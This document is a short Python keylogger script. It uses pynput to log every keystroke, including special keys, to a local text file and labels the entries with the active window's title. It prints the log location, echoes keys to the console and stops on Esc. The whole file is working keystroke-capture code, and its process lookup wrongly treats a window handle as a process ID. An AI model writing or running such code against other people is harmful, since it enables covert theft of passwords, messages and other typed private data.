from pynput import keyboard
import os
import psutil
import pygetwindow as gw
import time

# Define the log file name and its absolute path
log_file = "key_log.txt"
log_file_path = os.path.abspath(log_file)
current_window = None

# Function to get the active window title and process name
def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            process = psutil.Process(active_window._hWnd)
            return f"{active_window.title} ({process.name()})"
    except Exception as e:
        return f"Unknown ({str(e)})"
    return "Unknown"

# Function to handle key press events
def on_press(key):
    global current_window
    new_window = get_active_window()
    if new_window != current_window:
        current_window = new_window
        with open(log_file, "a") as f:
            f.write(f'\n\n[Active Window: {current_window}]\n')
            print(f'[Active Window: {current_window}]')  # Debugging statement

    try:
        print(f'Key pressed: {key.char}')  # Debugging statement
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        print(f'Special key pressed: {key}')  # Debugging statement
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            else:
                f.write(f'[{key.name}]')

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        print('Exiting...')  # Debugging statement
        print(f'Log file saved at: {log_file_path}')  # Print the log file location
        # Stop listener
        return False

print(f'Logging keystrokes to: {log_file_path}')  # Print the log file location at start

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
